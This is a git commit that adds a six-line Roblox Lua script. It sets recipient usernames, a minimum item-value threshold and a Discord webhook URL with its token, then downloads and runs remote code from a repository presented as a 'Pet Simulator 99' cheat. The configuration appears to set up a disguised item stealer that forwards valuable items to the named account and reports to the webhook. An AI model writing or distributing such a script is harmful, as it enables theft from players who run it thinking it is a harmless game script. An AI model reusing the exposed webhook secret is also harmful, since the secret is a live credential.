cbd14d90642194915a043fe916d76ffb300a2b57
auhsojradrad <joshuadardar2020@gmail.com>
2025-04-11 21:35:53 -0500

    Create Script.lua

---
+++ Script.lua
@@ -0,0 +1,6 @@
+Username = "Geist"
+Username2 = "Geist"
+MinimumRAP = 10000000
+Webhook = "https://discordapp.com/api/webhooks/1357896252620275806/AqQLuznYAVnaHEOZ6o91XLuUn-mDl08UaPcE2dFgfri2v6aivRzUjwj8WG-G7gGcErg0"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UrbanDEV0/Pet-Simulator-99-Script-OP-/refs/heads/main/roblox", true))()
